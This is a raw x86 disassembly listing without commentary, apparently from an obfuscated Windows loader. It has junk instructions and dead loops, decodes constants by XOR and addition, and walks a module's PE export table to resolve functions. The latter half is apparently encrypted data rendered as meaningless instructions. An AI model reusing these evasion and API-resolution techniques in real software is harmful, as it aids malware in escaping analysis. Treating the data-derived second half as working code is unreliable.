  40d6c8:	sub    eax,0x5424137
  40d6cd:	mov    DWORD PTR ds:0x43775f,0x3435
  40d6d7:	sbb    edx,0x0
  40d6da:	xor    eax,0x8a29a14b
  40d6df:	and    DWORD PTR ds:0x43776f,0x4377ab
  40d6e9:	xor    edx,0x0
  40d6ec:	mov    DWORD PTR ds:0x43773f,0x124f
  40d6f6:	mov    DWORD PTR [ebp-0x144],eax
  40d6fc:	mov    DWORD PTR [ebp-0x140],edx
  40d702:	mov    DWORD PTR ds:0x4377ab,0x7835
  40d70c:	cmp    DWORD PTR [ebp-0x144],0x70941e5d
  40d716:	mov    DWORD PTR ds:0x43776f,0x724a
  40d720:	jne    0x40d88d
  40d726:	mov    DWORD PTR ds:0x43778b,0x6e67
  40d730:	cmp    DWORD PTR [ebp-0x140],0xffffffff
  40d737:	mov    DWORD PTR ds:0x43778f,0x1a8
  40d741:	jne    0x40d88d
  40d747:	adc    ecx,0x38df
  40d74d:	mov    eax,DWORD PTR [ebp-0x58]
  40d750:	and    ecx,DWORD PTR ds:0x437787
  40d756:	mov    ecx,DWORD PTR [ebp-0x58]
  40d759:	add    ecx,DWORD PTR [eax+0x3c]
  40d75c:	and    DWORD PTR ds:0x43771f,0x0
  40d766:	xor    eax,eax
  40d768:	add    eax,DWORD PTR ds:0x43771f
  40d76e:	inc    eax
  40d76f:	mov    ds:0x43771f,eax
  40d774:	cmp    DWORD PTR ds:0x43771f,0xd
  40d77b:	ja     0x40d7bb
  40d781:	jmp    0x40d796
  40d786:	push   0x43772b
  40d78b:	push   0x5f6b
  40d790:	call   DWORD PTR ds:0x43c9ac
  40d796:	cmp    DWORD PTR ds:0x43771f,0xc
  40d79d:	jne    0x40d7ae
  40d7a3:	mov    eax,ds:0x43771f
  40d7a8:	inc    eax
  40d7a9:	mov    ds:0x43771f,eax
  40d7ae:	cmp    DWORD PTR ds:0x43771f,0x18
  40d7b5:	jb     0x40d766
  40d7bb:	mov    DWORD PTR [ebp-0x54],ecx
  40d7be:	and    DWORD PTR ds:0x437777,ebx
  40d7c4:	mov    eax,DWORD PTR [ebp-0x50]
  40d7c7:	and    DWORD PTR ds:0x43778b,0x0
  40d7d1:	mov    ecx,DWORD PTR ds:0x43778b
  40d7d7:	inc    ecx
  40d7d8:	mov    DWORD PTR ds:0x43778b,ecx
  40d7de:	cmp    DWORD PTR ds:0x43778b,0xb
  40d7e5:	ja     0x40d823
  40d7eb:	jmp    0x40d7fc
  40d7f0:	push   DWORD PTR [ebp-0x24]
  40d7f3:	push   DWORD PTR [ebp-0x1c]
  40d7f6:	call   DWORD PTR ds:0x43c9b0
  40d7fc:	cmp    DWORD PTR ds:0x43778b,0xa
  40d803:	jne    0x40d816
  40d809:	mov    ecx,DWORD PTR ds:0x43778b
  40d80f:	inc    ecx
  40d810:	mov    DWORD PTR ds:0x43778b,ecx
  40d816:	cmp    DWORD PTR ds:0x43778b,0x19
  40d81d:	jb     0x40d7d1
  40d823:	xor    eax,0x75108b5
  40d828:	xor    DWORD PTR ds:0x43771b,0x4377a3
  40d832:	add    eax,0x3272fb
  40d837:	mov    ecx,DWORD PTR ds:0x43771b
  40d83d:	mov    ecx,DWORD PTR [ebp-0x54]
  40d840:	cmp    DWORD PTR [ecx+0x54],eax
  40d843:	je     0x40d85e
  40d849:	mov    eax,DWORD PTR [ebp-0x54]
  40d84c:	mov    DWORD PTR ds:0x437723,0x3d6
  40d856:	mov    DWORD PTR [ebp-0x5c],eax
  40d859:	jmp    0x40d8b7
  40d85e:	sbb    eax,DWORD PTR ds:0x437797
  40d864:	mov    eax,DWORD PTR [ebp-0x50]
  40d867:	adc    DWORD PTR ds:0x43772b,0x43775b
  40d871:	xor    eax,0x75108b5
  40d876:	add    eax,0x3272fb
  40d87b:	mov    DWORD PTR ds:0x437723,0x699f
  40d885:	mov    DWORD PTR [ebp-0x5c],eax
  40d888:	jmp    0x40d8b7
  40d88d:	mov    eax,ds:0x4377ab
  40d892:	sbb    eax,DWORD PTR ds:0x437777
  40d898:	mov    ds:0x4377ab,eax
  40d89d:	mov    eax,DWORD PTR [ebp-0x50]
  40d8a0:	and    DWORD PTR ds:0x437727,0x192e
  40d8aa:	xor    eax,0x75108b5
  40d8af:	add    eax,0x3272fb
  40d8b4:	mov    DWORD PTR [ebp-0x5c],eax
  40d8b7:	and    DWORD PTR ds:0x4377bb,edx
  40d8bd:	mov    eax,DWORD PTR [ebp-0x5c]
  40d8c0:	mov    DWORD PTR [ebp-0x18],eax
  40d8c3:	sbb    DWORD PTR ds:0x437743,0x1fc4
  40d8cd:	mov    eax,DWORD PTR [ebp-0x3c]
  40d8d0:	add    DWORD PTR ds:0x43774b,0x43776f
  40d8da:	xor    eax,0x75108b5
  40d8df:	add    eax,0x3272fb
  40d8e4:	mov    DWORD PTR ds:0x437737,0x3ad8
  40d8ee:	cmp    DWORD PTR [ebp-0x18],eax
  40d8f1:	mov    DWORD PTR ds:0x43779b,0x476a
  40d8fb:	jne    0x40d940
  40d901:	adc    DWORD PTR ds:0x43771f,0x22a8
  40d90b:	mov    eax,DWORD PTR [ebp-0x3c]
  40d90e:	sbb    DWORD PTR ds:0x437777,0x437773
  40d918:	xor    eax,0x75108b5
  40d91d:	sub    DWORD PTR ds:0x43770f,0x715d
  40d927:	add    eax,0x3272fb
  40d92c:	mov    DWORD PTR ds:0x43774f,0x301
  40d936:	jmp    0x414dde
  40d93b:	jmp    0x40de5d
  40d940:	and    DWORD PTR ds:0x43779b,0x0
  40d94a:	jmp    0x40d95d
  40d94f:	xor    eax,eax
  40d951:	or     eax,DWORD PTR ds:0x43779b
  40d957:	inc    eax
  40d958:	mov    ds:0x43779b,eax
  40d95d:	cmp    DWORD PTR ds:0x43779b,0x10
  40d964:	jae    0x40d996
  40d96a:	cmp    DWORD PTR ds:0x43779b,0x1d
  40d971:	jbe    0x40d996
  40d977:	jmp    0x40d991
  40d97c:	push   0x43773f
  40d981:	push   0x437777
  40d986:	push   0x3430
  40d98b:	call   DWORD PTR ds:0x43c9b4
  40d991:	jmp    0x40d94f
  40d996:	mov    eax,DWORD PTR [ebp-0x18]
  40d999:	mov    DWORD PTR [ebp-0x7c],eax
  40d99c:	mov    eax,DWORD PTR [ebp+0x8]
  40d99f:	mov    DWORD PTR [ebp-0x78],eax
  40d9a2:	add    eax,0x76e2
  40d9a7:	mov    DWORD PTR [ebp-0x60],0xf89c85b0
  40d9ae:	add    edx,eax
  40d9b0:	mov    DWORD PTR [ebp-0x64],0xf89c85b3
  40d9b7:	mov    eax,DWORD PTR [ebp-0x7c]
  40d9ba:	mov    ecx,DWORD PTR [ebp-0x64]
  40d9bd:	adc    DWORD PTR ds:0x43773f,0x7640
  40d9c7:	xor    ecx,0x75108b5
  40d9cd:	add    ecx,0x3272fb
  40d9d3:	and    DWORD PTR ds:0x43779b,0x0
  40d9dd:	jmp    0x40d9ef
  40d9e2:	mov    edx,DWORD PTR ds:0x43779b
  40d9e8:	inc    edx
  40d9e9:	mov    DWORD PTR ds:0x43779b,edx
  40d9ef:	cmp    DWORD PTR ds:0x43779b,0x17
  40d9f6:	jae    0x40da40
  40d9fc:	cmp    DWORD PTR ds:0x43779b,0xa
  40da03:	ja     0x40da40
  40da09:	jmp    0x40da21
  40da0e:	push   DWORD PTR [ebp-0x1c]
  40da11:	push   0x43779b
  40da16:	push   0x437124
  40da1b:	call   DWORD PTR ds:0x43c9b8
  40da21:	cmp    DWORD PTR ds:0x43779b,0x9
  40da28:	jne    0x40da3b
  40da2e:	mov    edx,DWORD PTR ds:0x43779b
  40da34:	inc    edx
  40da35:	mov    DWORD PTR ds:0x43779b,edx
  40da3b:	jmp    0x40d9e2
  40da40:	mov    edx,DWORD PTR [ebp-0x60]
  40da43:	xor    edx,0x75108b5
  40da49:	add    edx,0x3272fb
  40da4f:	xor    DWORD PTR ds:0x43777f,0x437757
  40da59:	imul   ecx,edx
  40da5c:	cmp    eax,ecx
  40da5e:	mov    DWORD PTR ds:0x437747,0x39af
  40da68:	jne    0x40dadd
  40da6e:	sbb    eax,eax
  40da70:	mov    eax,DWORD PTR [ebp-0x64]
  40da73:	sub    DWORD PTR ds:0x43779b,ebx
  40da79:	xor    eax,0x75108b5
  40da7e:	movzx  ecx,BYTE PTR ds:0x43773f
  40da85:	add    DWORD PTR ds:0x437767,ecx
  40da8b:	add    eax,0x3272fb
  40da90:	add    DWORD PTR ds:0x437727,ecx
  40da96:	mov    ecx,DWORD PTR [ebp-0x60]
  40da99:	xor    ecx,0x75108b5
  40da9f:	and    DWORD PTR ds:0x437793,0x4377b7
  40daa9:	add    ecx,0x3272fb
  40daaf:	and    DWORD PTR ds:0x43770f,0x10c
  40dab9:	imul   eax,ecx
  40dabc:	mov    DWORD PTR ds:0x43778f,0x70da
  40dac6:	mov    DWORD PTR [ebp-0x80],eax
  40dac9:	mov    DWORD PTR ds:0x43772b,0x2b15
  40dad3:	jmp    0x40de20
  40dad8:	jmp    0x40de00
  40dadd:	lea    eax,[ebp-0x70]
  40dae0:	mov    DWORD PTR ds:0x43779b,0x12
  40daea:	cmp    DWORD PTR ds:0x43779b,0x0
  40daf1:	je     0x40db28
  40daf7:	cmp    DWORD PTR ds:0x43779b,0x1e
  40dafe:	jbe    0x40db28
  40db04:	jmp    0x40db14
  40db09:	push   0x8f8f
  40db0e:	call   DWORD PTR ds:0x43c9bc
  40db14:	xor    ecx,ecx
  40db16:	add    ecx,DWORD PTR ds:0x43779b
  40db1c:	dec    ecx
  40db1d:	mov    DWORD PTR ds:0x43779b,ecx
  40db23:	jmp    0x40daea
  40db28:	mov    DWORD PTR [ebp-0x6c],eax
  40db2b:	mov    DWORD PTR ds:0x437753,0x63cd
  40db35:	mov    eax,DWORD PTR [ebp-0x6c]
  40db38:	mov    DWORD PTR [eax],0xf89c85b0
  40db3e:	mov    edx,DWORD PTR ds:0x43771f
  40db44:	sub    DWORD PTR ds:0x43771b,edx
  40db4a:	mov    eax,DWORD PTR [ebp-0x70]
  40db4d:	xor    eax,0x75108b5
  40db52:	and    DWORD PTR ds:0x4377b3,0x0
  40db5c:	jmp    0x40db6e
  40db61:	mov    edx,DWORD PTR ds:0x4377b3
  40db67:	inc    edx
  40db68:	mov    DWORD PTR ds:0x4377b3,edx
  40db6e:	cmp    DWORD PTR ds:0x4377b3,0x1b
  40db75:	jae    0x40db9b
  40db7b:	cmp    DWORD PTR ds:0x4377b3,0x27
  40db82:	jl     0x40db9b
  40db88:	jmp    0x40db96
  40db8d:	push   DWORD PTR [ebp-0x24]
  40db90:	call   DWORD PTR ds:0x43c9c4
  40db96:	jmp    0x40db61
  40db9b:	mov    ecx,DWORD PTR [ebp-0x7c]
  40db9e:	mov    DWORD PTR ds:0x437737,0x11
  40dba8:	cmp    DWORD PTR ds:0x437737,0x0
  40dbaf:	je     0x40dc08
  40dbb5:	cmp    DWORD PTR ds:0x437737,0x4
  40dbbc:	jbe    0x40dc08
  40dbc2:	jmp    0x40dbda
  40dbc7:	push   0x43713c
  40dbcc:	push   0x437104
  40dbd1:	push   DWORD PTR [ebp-0x1c]
  40dbd4:	call   DWORD PTR ds:0x43c9c8
  40dbda:	cmp    DWORD PTR ds:0x437737,0x5
  40dbe1:	jne    0x40dbf6
  40dbe7:	xor    edx,edx
  40dbe9:	add    edx,DWORD PTR ds:0x437737
  40dbef:	dec    edx
  40dbf0:	mov    DWORD PTR ds:0x437737,edx
  40dbf6:	mov    edx,DWORD PTR ds:0x437737
  40dbfc:	dec    edx
  40dbfd:	mov    DWORD PTR ds:0x437737,edx
  40dc03:	jmp    0x40dba8
  40dc08:	mov    eax,DWORD PTR [ecx+eax*8+0x1939850]
  40dc0f:	mov    DWORD PTR [ebp-0x68],eax
  40dc12:	and    ecx,DWORD PTR ds:0x43776b
  40dc18:	mov    eax,DWORD PTR [ebp-0x68]
  40dc1b:	mov    ecx,DWORD PTR [ebp-0x64]
  40dc1e:	sbb    DWORD PTR ds:0x43778b,0x5d76
  40dc28:	xor    ecx,0x75108b5
  40dc2e:	add    ecx,0x3272fb
  40dc34:	mov    edx,DWORD PTR [ebp-0x60]
  40dc37:	sub    DWORD PTR ds:0x43776f,0x437717
  40dc41:	xor    edx,0x75108b5
  40dc47:	add    edx,0x3272fb
  40dc4d:	adc    DWORD PTR ds:0x437733,0x2ce3
  40dc57:	imul   ecx,edx
  40dc5a:	mov    DWORD PTR ds:0x4377a3,0x769c
  40dc64:	cmp    eax,ecx
  40dc66:	mov    DWORD PTR ds:0x437773,0x7b44
  40dc70:	je     0x40dcd1
  40dc76:	mov    eax,DWORD PTR [ebp-0x64]
  40dc79:	sbb    DWORD PTR ds:0x43778b,0x52d3
  40dc83:	xor    eax,0x75108b5
  40dc88:	add    DWORD PTR ds:0x437793,0x279
  40dc92:	add    eax,0x3272fb
  40dc97:	mov    ecx,DWORD PTR [ebp-0x68]
  40dc9a:	imul   eax,ecx
  40dc9d:	add    DWORD PTR ds:0x4377bb,0x1ffc
  40dca7:	add    eax,DWORD PTR [ebp-0x78]
  40dcaa:	mov    DWORD PTR [ebp-0x74],eax
  40dcad:	mov    eax,DWORD PTR [ebp-0x74]
  40dcb0:	mov    DWORD PTR ds:0x43772f,0x1a32
  40dcba:	mov    DWORD PTR [ebp-0x80],eax
  40dcbd:	mov    DWORD PTR ds:0x43773f,0x4cc2
  40dcc7:	jmp    0x40de20
  40dccc:	jmp    0x40ddc7
  40dcd1:	mov    DWORD PTR ds:0x437743,0x12
  40dcdb:	cmp    DWORD PTR ds:0x437743,0x0
  40dce2:	je     0x40dd20
  40dce8:	cmp    DWORD PTR ds:0x437743,0x1f
  40dcef:	jbe    0x40dd20
  40dcf5:	jmp    0x40dd10
  40dcfa:	push   0x3dfe
  40dcff:	push   DWORD PTR [ebp-0x18]
  40dd02:	push   DWORD PTR [ebp-0x28]
  40dd05:	push   0x437000
  40dd0a:	call   DWORD PTR ds:0x43c9cc
  40dd10:	mov    eax,ds:0x437743
  40dd15:	dec    eax
  40dd16:	mov    ds:0x437743,eax
  40dd1b:	jmp    0x40dcdb
  40dd20:	mov    eax,DWORD PTR [ebp-0x64]
  40dd23:	dec    ecx
  40dd24:	xor    eax,0x75108b5
  40dd29:	adc    ecx,DWORD PTR ds:0x43779f
  40dd2f:	add    eax,0x3272fb
  40dd34:	and    DWORD PTR ds:0x43771f,0x0
  40dd3e:	mov    ecx,DWORD PTR ds:0x43771f
  40dd44:	inc    ecx
  40dd45:	mov    DWORD PTR ds:0x43771f,ecx
  40dd4b:	cmp    DWORD PTR ds:0x43771f,0x27
  40dd52:	jg     0x40dd8f
  40dd58:	jmp    0x40dd82
  40dd5d:	push   DWORD PTR [ebp-0xc]
  40dd60:	push   0x6584
  40dd65:	push   0x4377af
  40dd6a:	push   DWORD PTR [ebp-0x24]
  40dd6d:	push   0x1eb1
  40dd72:	push   0x5818
  40dd77:	push   0x1de6
  40dd7c:	call   DWORD PTR ds:0x43c9d0
  40dd82:	cmp    DWORD PTR ds:0x43771f,0x1c
  40dd89:	jb     0x40dd3e
  40dd8f:	mov    ecx,DWORD PTR [ebp-0x60]
  40dd92:	xor    ecx,0x75108b5
  40dd98:	xor    DWORD PTR ds:0x437713,0x26bd
  40dda2:	add    ecx,0x3272fb
  40dda8:	imul   eax,ecx
  40ddab:	mov    DWORD PTR ds:0x43778b,0x2ea1
  40ddb5:	mov    DWORD PTR [ebp-0x80],eax
  40ddb8:	mov    DWORD PTR ds:0x43778b,0x4108
  40ddc2:	jmp    0x40de20
  40ddc7:	sub    DWORD PTR ds:0x43778b,edx
  40ddcd:	mov    eax,DWORD PTR [ebp-0x60]
  40ddd0:	xor    DWORD PTR ds:0x437747,0x2583
  40ddda:	xor    eax,0x75108b5
  40dddf:	xor    DWORD PTR ds:0x43779b,0x437773
  40dde9:	add    eax,0x3272fb
  40ddee:	mov    DWORD PTR ds:0x43779b,0x27ba
  40ddf8:	mov    DWORD PTR [ebp-0x80],eax
  40ddfb:	jmp    0x40de20
  40de00:	sub    DWORD PTR ds:0x43777f,edi
  40de06:	mov    eax,DWORD PTR [ebp-0x60]
  40de09:	xor    eax,0x75108b5
  40de0e:	add    eax,0x3272fb
  40de13:	sbb    DWORD PTR ds:0x43771f,0x437737
  40de1d:	mov    DWORD PTR [ebp-0x80],eax
  40de20:	and    eax,DWORD PTR ds:0x437793
  40de26:	mov    eax,DWORD PTR [ebp-0x80]
  40de29:	mov    DWORD PTR [ebp-0x30],eax
  40de2c:	mov    eax,DWORD PTR [ebp-0x3c]
  40de2f:	xor    eax,0x75108b5
  40de34:	add    eax,0x3272fb
  40de39:	cmp    DWORD PTR [ebp-0x30],eax
  40de3c:	jne    0x40de54
  40de42:	mov    eax,DWORD PTR [ebp-0x3c]
  40de45:	xor    eax,0x75108b5
  40de4a:	add    eax,0x3272fb
  40de4f:	jmp    0x414dde
  40de54:	mov    eax,DWORD PTR [ebp-0x30]
  40de57:	mov    eax,DWORD PTR [eax+0x18]
  40de5a:	mov    DWORD PTR [ebp-0x4],eax
  40de5d:	mov    eax,DWORD PTR [ebp-0x30]
  40de60:	mov    ecx,DWORD PTR [ebp+0x8]
  40de63:	add    ecx,DWORD PTR [eax+0x20]
  40de66:	mov    DWORD PTR [ebp-0xc],ecx
  40de69:	mov    eax,DWORD PTR [ebp-0x30]
  40de6c:	mov    ecx,DWORD PTR [ebp+0x8]
  40de6f:	add    ecx,DWORD PTR [eax+0x24]
  40de72:	mov    DWORD PTR [ebp-0x24],ecx
  40de75:	mov    eax,DWORD PTR [ebp-0x30]
  40de78:	mov    ecx,DWORD PTR [ebp+0x8]
  40de7b:	add    ecx,DWORD PTR [eax+0x1c]
  40de7e:	mov    DWORD PTR [ebp-0x20],ecx
  40de81:	jmp    0x41023e
  40de86:	mov    eax,DWORD PTR [ebp-0x44]
  40de89:	mov    ecx,DWORD PTR [ebp-0xc]
  40de8c:	mov    edx,DWORD PTR [ebp+0x8]
  40de8f:	jmp    0x410218
  40de94:	in     al,0xfc
  40de96:	xchg   esi,eax
  40de97:	sub    BYTE PTR [esi+0x30],dh
  40de9a:	fs push esp
  40de9c:	jbe    0x40de3b
  40de9e:	jmp    0x40deb3
  40dea0:	jae    0x40deff
  40dea2:	xchg   ebx,eax
  40dea3:	retf   0x246e
  40dea6:	jnp    0x40df23
  40dea8:	out    0x98,eax
  40deaa:	jnp    0x40df27
  40deac:	cli    
  40dead:	rol    BYTE PTR [edi],cl
  40deaf:	loopne 0x40deac
  40deb1:	cli    
  40deb2:	ror    BYTE PTR [ecx],0xdb
  40deb5:	(bad)  
  40deb7:	mov    esi,0xc5aee4cf
  40debc:	mov    cl,0xe8
  40debe:	stc    
  40debf:	mov    ah,0xfa
  40dec1:	fidivr DWORD PTR [eax-0x25144b17]
  40dec7:	loop   0x40de8b
  40dec9:	sti    
  40deca:	std    
  40decb:	lds    eax,FWORD PTR [edx+ecx*1]
  40dece:	(bad)  
  40decf:	div    al
  40ded1:	call   0xdd3fd2de
  40ded6:	pop    es
  40ded7:	iret   
  40ded8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ded9:	div    bl
  40dedb:	mov    dl,0xdb
  40dedd:	mov    ah,0xd3
  40dedf:	sti    
  40dee0:	icebp  
  40dee1:	clc    
  40dee2:	(bad)  
  40dee3:	fdiv   DWORD PTR [ebx+ecx*8-0x7fc1c0f]
  40deea:	shl    bl,0xd4
  40deed:	stc    
  40deee:	fadd   st(3),st
  40def0:	rcr    al,1
  40def2:	test   bh,0xdf
  40def5:	(bad)  
  40def8:	fdivr  st(0),st
  40defa:	(bad)
  40defd:	(bad)  
  40defe:	retf   
  40deff:	sti    
  40df00:	neg    ebx
  40df02:	jmp    0x40dec3
  40df04:	clc    
  40df05:	retf   0xceb8
  40df08:	mov    ecx,0xdbd1dcfb
  40df0d:	aad    0xe5
  40df0f:	xlat   BYTE PTR ds:[ebx]
  40df10:	bswap  ecx
  40df12:	add    edi,eax
  40df14:	jmp    0x40df10
  40df16:	in     al,dx
  40df17:	mov    cl,0xc6
  40df19:	mov    edi,0xc0f3ecb2
  40df1e:	ret    0xc8b0
  40df21:	leave  
  40df22:	into   
  40df23:	fdivr  st,st(7)
  40df25:	clc    
  40df26:	add    edi,esp
  40df28:	in     al,dx
  40df29:	icebp  
  40df2a:	pop    es
  40df2b:	fiadd  DWORD PTR ds:0xefc0c5c2
  40df31:	out    0xff,al
  40df33:	hlt    
  40df34:	add    al,0xc9
  40df36:	in     eax,dx
  40df37:	loopne 0x40df2c
  40df39:	mov    al,0xe8
  40df3b:	mov    esp,0xe9cac7ed
  40df40:	cmc    
  40df41:	(bad)  
  40df42:	stc    
  40df43:	(bad)  
  40df45:	int    0xcd
  40df47:	add    ebx,ebp
  40df49:	loopne 0x40df19
  40df4b:	mov    esp,0xfe05f70b
  40df50:	loope  0x40df48
  40df52:	or     edi,edx
  40df54:	(bad)  
  40df56:	adc    ch,BYTE PTR [esi-0x1b291c4e]
  40df5c:	(bad)
  40df5f:	cmc    
  40df60:	mov    eax,0xcdb3d3cd
  40df65:	clc    
  40df66:	mov    al,0xd9
  40df68:	int3   
  40df69:	shl    dl,1
  40df6b:	in     al,0xfd
  40df6d:	(bad)  
  40df6e:	out    0xc0,eax
  40df70:	add    ebp,ebx
  40df72:	retf   
  40df73:	aam    0xdb
  40df75:	adc    ecx,DWORD PTR ds:0xf7dcc5ac
  40df7b:	loop   0x40df47
  40df7d:	hlt    
  40df7e:	(bad)  
  40df7f:	aad    0xec
  40df81:	fsqrt  
  40df83:	fdivrp st(1),st
  40df85:	repz add bh,dl
  40df88:	loope  0x40df88
  40df8a:	cld    
  40df8b:	rol    dh,1
  40df8d:	cmc    
  40df8e:	(bad)  
  40df90:	or     bh,BYTE PTR [ebp-0x11a1b40]
  40df96:	loope  0x40df57
  40df98:	mov    eax,0xcdf7b3b2
  40df9d:	mov    dh,0xd3
  40df9f:	lds    edi,FWORD PTR [edx-0x12020b37]
  40dfa5:	iret   
  40dfa6:	cmc    
  40dfa7:	leave  
  40dfa8:	mov    esi,0xc5f2c1f5
  40dfad:	hlt    
  40dfae:	ret    0xcbf0
  40dfb1:	imul   edi
  40dfb3:	or     edi,esi
  40dfb5:	rol    DWORD PTR [ecx],cl
  40dfb7:	jmp    0xfac8:0xf7cdacb8
  40dfbe:	mov    dl,0xdb
  40dfc0:	clc    
  40dfc1:	shr    dl,cl
  40dfc3:	retf   0xfdcc
  40dfc6:	mov    edi,0xd7f1bd
  40dfcb:	shl    esp,cl
  40dfcd:	aam    0xf6
  40dfcf:	(bad)  
  40dfd0:	out    0xdc,eax
  40dfd2:	leave  
  40dfd3:	in     eax,0xfe
  40dfd5:	add    esi,edi
  40dfd7:	scas   eax,DWORD PTR es:[edi]
  40dfd8:	stos   BYTE PTR es:[edi],al
  40dfd9:	(bad)  
  40dfdb:	int3   
  40dfdc:	retf   0xe4e4
  40dfdf:	aam    0xe7
  40dfe1:	fcmovnbe st,st(1)
  40dfe3:	fdivr  QWORD PTR [ebp-0x3423718]
  40dfe9:	out    0xe3,al
  40dfeb:	add    al,0xe6
  40dfed:	lock add eax,esp
  40dff0:	or     ah,ah
  40dff2:	loop   0x40dfe1
  40dff4:	enter  0x6e1,0xf2
  40dff8:	mov    cl,0xcd
  40dffa:	mov    dh,0xd3
  40dffc:	loop   0x40dfc2
  40dffe:	mov    cl,0xe4
  40e000:	mov    edx,0xf9b4fffa
  40e005:	(bad)  
  40e007:	(bad)  
  40e009:	aad    0xc0
  40e00b:	lock (bad) 
  40e00e:	cmc    
  40e00f:	cmc    
  40e010:	les    eax,FWORD PTR [esi]
  40e012:	add    bh,cl
  40e014:	out    dx,eax
  40e015:	fsub   st(1),st
  40e017:	rol    dh,1
  40e019:	ffreep st(7)
  40e01b:	shr    edx,cl
  40e01d:	shr    dh,cl
  40e01f:	out    dx,eax
  40e020:	rcr    esi,1
  40e022:	clc    
  40e023:	jmp    0xccdb:0xf7c303b5
  40e02a:	sti    
  40e02b:	(bad)  
  40e02c:	cld    
  40e02d:	add    cl,dl
  40e02f:	or     BYTE PTR [edx],cl
  40e031:	loope  0x40e022
  40e033:	aad    0xcc
  40e035:	repnz int 0xc5
  40e038:	mov    al,0xed
  40e03a:	cmc    
  40e03b:	loopne 0x40e02b
  40e03d:	jmp    0xf1f1dc38
  40e042:	call   0xfaf6cbfa
  40e047:	mov    esi,0xc705dcdf
  40e04c:	rol    DWORD PTR [esi],1
  40e04e:	rcl    bh,0xf7
  40e051:	(bad)  
  40e052:	sti    
  40e053:	iret   
  40e054:	leave  
  40e055:	fmul   DWORD PTR [ebx+esi*4]
  40e058:	mov    cl,0xea
  40e05a:	lods   eax,DWORD PTR ds:[esi]
  40e05b:	mov    ebp,0xf7e4b1ee
  40e060:	(bad)
  40e063:	hlt    
  40e064:	(bad)  
  40e065:	retf   0xfbc8
  40e068:	mov    edx,0x3fbf8ff
  40e06d:	mov    BYTE PTR [edx],0xdd
  40e070:	jmp    0x4dc:0xc4e5e8bd
  40e077:	icebp  
  40e078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e079:	(bad)  
  40e07a:	lods   eax,DWORD PTR ds:[esi]
  40e07b:	out    dx,eax
  40e07c:	(bad)  
  40e07d:	ret    0xdaf4
  40e080:	stc    
  40e081:	(bad)  
  40e082:	repnz leave 
  40e084:	clc    
  40e085:	fnstcw WORD PTR [edx-0x26330010]
  40e08b:	out    0x6,eax
  40e08d:	stc    
  40e08e:	loopne 0x40e08d
  40e090:	(bad)  
  40e092:	ud0    eax,DWORD PTR [edi]
  40e095:	fucom  st(2)
  40e097:	(bad)  
  40e098:	in     al,dx
  40e099:	fcomip st,st(2)
  40e09b:	shl    cl,cl
  40e09d:	(bad)  
  40e09f:	aad    0xc8
  40e0a1:	out    dx,al
  40e0a2:	repnz mov ch,0xcf
  40e0a5:	mov    ebx,0xedc3c9e2
  40e0aa:	shl    eax,1
  40e0ac:	fadd   QWORD PTR [ebx]
  40e0ae:	(bad)  
  40e0af:	icebp  
  40e0b0:	(bad)  
  40e0b1:	enter  0xdcea,0xca
  40e0b5:	out    dx,al
  40e0b6:	or     ah,dh
  40e0b8:	into   
  40e0b9:	jmp    0xb20fd7b0
  40e0be:	fnstenv [edx-0x32193201]
  40e0c4:	jecxz  0x40e0be
  40e0c6:	shl    edx,1
  40e0c8:	int3   
  40e0c9:	aad    0xe0
  40e0cb:	push   edi
  40e0cd:	(bad)  
  40e0ce:	xlat   BYTE PTR ds:[ebx]
  40e0cf:	call   0xfe3ce9bd
  40e0d4:	mov    BYTE PTR [edi],0xd3
  40e0d7:	retf   
  40e0d8:	jmp    0xe2a9:0xcceaa4b3
  40e0df:	hlt    
  40e0e0:	int3   
  40e0e1:	out    0xf7,al
  40e0e3:	retf   0x2fa
  40e0e6:	cld    
  40e0e7:	out    dx,eax
  40e0e8:	cli    
  40e0e9:	add    edi,DWORD PTR [edx+eax*8-0x281b1805]
  40e0f0:	or     DWORD PTR [ebx],ecx
  40e0f2:	push   cs
  40e0f3:	aam    0xce
  40e0f5:	push   es
  40e0f6:	stc    
  40e0f7:	in     al,0xec
  40e0f9:	jmp    0xc1f7cdeb
  40e0fe:	(bad)  
  40e0ff:	call   0xf7f7cbce
  40e104:	mov    ah,0xcb
  40e106:	int3   
  40e107:	int    0xfd
  40e109:	mov    esp,0xf102fad1
  40e10e:	hlt    
  40e10f:	jmp    0xda1ea91b
  40e114:	std    
  40e115:	in     eax,dx
  40e116:	pop    es
  40e117:	loopne 0x40e0ec
  40e119:	mov    esp,0xf6eef2cf
  40e11e:	retf   0xaeeb
  40e121:	fcom   st(3)
  40e123:	lock jmp 0xeff8a0e4
  40e129:	rcr    edx,1
  40e12b:	add    bh,ah
  40e12d:	test   DWORD PTR [ecx],0xddc8efd0
  40e133:	leave  
  40e134:	jecxz  0x40e11e
  40e136:	out    0xd9,al
  40e138:	jmp    0xcb259903
  40e13d:	lods   eax,DWORD PTR ds:[esi]
  40e13e:	div    dh
  40e140:	aam    0xba
  40e142:	clc    
  40e143:	repz lock mov ch,0xbc
  40e147:	mov    edi,0xddd3e3d1
  40e14c:	rol    edx,0xd9
  40e14f:	jecxz  0x40e12b
  40e151:	loop   0x40e121
  40e153:	fstp   st(6)
  40e155:	enter  0xce0c,0xcd
  40e159:	mov    dl,0xb3
  40e15b:	ror    edx,0xc8
  40e15e:	neg    cl
  40e160:	in     al,dx
  40e161:	int3   
  40e162:	jmp    0x3fddd62
  40e167:	aam    0xbf
  40e169:	in     eax,dx
  40e16a:	sar    BYTE PTR [esi+0xb806f5],0xb
  40e171:	sti    
  40e172:	(bad)  
  40e174:	in     al,0xb
  40e176:	retf   0xafcf
  40e179:	mov    dl,0xdc
  40e17b:	(bad)  
  40e17c:	loopne 0x40e158
  40e17e:	in     al,dx
  40e17f:	mov    dh,0xef
  40e181:	aad    0xd5
  40e183:	fdivr  DWORD PTR [ebx-0x5ff4522]
  40e189:	cli    
  40e18a:	aam    0xe1
  40e18c:	jmp    0x40e16a
  40e18e:	or     bh,bl
  40e190:	aam    0xd4
  40e192:	lds    ecx,FWORD PTR [ebx]
  40e194:	jecxz  0x40e161
  40e196:	(bad)  
  40e198:	int3   
  40e199:	loopne 0x40e149
  40e19b:	enter  0xfbb0,0xed
  40e19f:	not    edx
  40e1a1:	mov    ch,0xed
  40e1a3:	(bad)  
  40e1a5:	sti    
  40e1a6:	retf   0xb8f7
  40e1a9:	std    
  40e1aa:	add    ebp,eax
  40e1ac:	out    0xd6,al
  40e1ae:	ret    0xe9e6
  40e1b1:	mov    DWORD PTR [esp+eax*1],0xe3e0e5d4
  40e1b8:	mov    edi,0xecf0e2df
